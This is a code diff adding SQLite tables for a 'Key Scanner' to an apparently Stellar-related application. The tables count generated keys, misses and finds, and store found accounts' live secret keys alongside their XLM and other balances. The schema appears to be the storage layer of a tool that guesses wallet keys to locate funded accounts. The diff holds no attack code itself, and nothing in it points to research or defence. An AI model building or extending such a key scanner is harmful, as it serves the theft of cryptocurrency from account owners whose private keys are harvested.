@@ -349,6 +349,38 @@ function initDb(): Database.Database {
     );
 
     CREATE INDEX IF NOT EXISTS idx_tracer_watch_events_watch ON tracer_watch_events(watch_id, created_at DESC);
+
+    -- ── Key Scanner (local-only; loop does not run on Vercel) ──────────────────
+    -- Single-row state table (id always 'local'). Hits store live secret keys —
+    -- never mirrored to Supabase, matches the tracer-v2 Watchlist precedent above.
+    CREATE TABLE IF NOT EXISTS key_scan_state (
+      id                TEXT    PRIMARY KEY,
+      network           TEXT    NOT NULL DEFAULT 'public',
+      running           INTEGER NOT NULL DEFAULT 0,
+      resume_on_boot    INTEGER NOT NULL DEFAULT 1,
+      paced_rps         REAL    NOT NULL DEFAULT 5,
+      concurrency       INTEGER NOT NULL DEFAULT 3,
+      total_generated   INTEGER NOT NULL DEFAULT 0,
+      total_not_found   INTEGER NOT NULL DEFAULT 0,
+      total_found       INTEGER NOT NULL DEFAULT 0,
+      total_errors      INTEGER NOT NULL DEFAULT 0,
+      recent_tail_json  TEXT    NOT NULL DEFAULT '[]',
+      started_at        INTEGER,
+      last_activity_at  INTEGER,
+      last_error        TEXT
+    );
+
+    CREATE TABLE IF NOT EXISTS key_scan_hits (
+      id               TEXT    PRIMARY KEY,
+      public_key       TEXT    NOT NULL UNIQUE,
+      secret_key       TEXT    NOT NULL,
+      network          TEXT    NOT NULL,
+      xlm_balance      REAL,
+      balances_json    TEXT    NOT NULL,
+      sequence         TEXT,
+      subentry_count   INTEGER,
+      found_at         INTEGER NOT NULL
+    );
   `);
 
   // ── Auto-send migrations ──────────────────────────────────────────────────
